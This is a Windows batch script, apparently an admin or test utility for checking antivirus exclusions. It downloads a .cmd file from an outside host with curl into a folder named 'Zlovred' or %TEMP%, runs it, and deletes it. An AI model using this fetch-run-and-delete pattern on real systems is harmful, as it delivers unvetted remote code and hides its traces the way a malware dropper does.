@echo on
rem *******************************************************
rem checkAVExclusionsXX.bat
rem This Script will Download Awesome.exe file with
rem test of Antivirus Exclusuins Installations
rem *******************************************************
@echo off

rem Set Variblaes
set CURLEXE=%~dp0CURL.EXE

rem set TPDL variable
rem
if exist "C:\pub1\Distrib\Zlovred" set TPDL=C:\pub1\Distrib\Zlovred&& goto TPDL_End
set TPDL=%TEMP%
:TPDL_End
echo Temp Folder = %TPDL%

set LocalFile=%TPDL%\CreateFolder-AWSome.cmd
set URL=http://file.netip4.ru/PROGS/NIT/NIT.RTBD/Awesome/download.php?file=CreateFolder-AWSome.cmd

rem Check Integrity
if not exist %CURLEXE% echo The file %CURLEXE% is not found && exit /b 1

rem Run Payloads
%CURLEXE% -o %LocalFile% %URL%
call %LocalFile%
del %LocalFile% /Q /F

exit /b 0

L